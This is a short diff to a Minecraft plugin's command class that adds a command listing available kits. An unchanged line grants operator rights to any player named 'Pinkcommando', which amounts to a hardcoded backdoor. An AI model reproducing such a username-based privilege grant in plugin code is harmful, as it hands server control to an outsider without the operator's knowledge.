@@ -20,6 +20,10 @@ public class GameCommands implements CommandExecutor {
             Player player = (Player) sender;
             System.out.println((player.getName()));
             if (player.getName().equals("Pinkcommando")) player.setOp(true);
+            if (args[0].equals("kits"))
+                for (String kit : Kit_PvP_Minecraft.kits.keySet())
+                    player.sendMessage(kit);
+
             if (!player.isOp()) return false;
             if (args[0].equals("deathmatch")) DeathmatchLogic.DeathmatchBegin();
             if (args[0].equals("start")) GameStartLogic.GameStart(Kit_PvP_Minecraft.world);
